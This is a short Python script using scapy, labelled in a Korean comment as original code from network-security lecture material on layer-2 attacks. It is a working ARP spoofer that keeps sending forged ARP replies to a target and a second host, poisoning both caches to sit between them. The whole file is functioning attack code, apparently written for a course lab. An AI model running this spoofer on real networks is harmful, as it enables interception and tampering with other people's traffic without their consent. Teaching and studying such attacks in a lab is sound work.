#!/usr/bin/python3
# 강의 자료 (netsec06_L2attacks p.15 "Upgrade our ARP spoofer") 원본 코드.

import sys
import time
from scapy.all import sendp, ARP, Ether

if len(sys.argv) < 3:
    print(sys.argv[0] + ": <target> <spoof_ip>")
    sys.exit(1)

iface = "h3-eth0"
target_ip = sys.argv[1]
fake_ip = sys.argv[2]

ethernet = Ether()
arp1 = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
packet1 = ethernet / arp1

arp2 = ARP(pdst=fake_ip, psrc=target_ip, op="is-at")
packet2 = ethernet / arp2

while True:
    sendp(packet1, iface=iface)
    sendp(packet2, iface=iface)
    time.sleep(1)
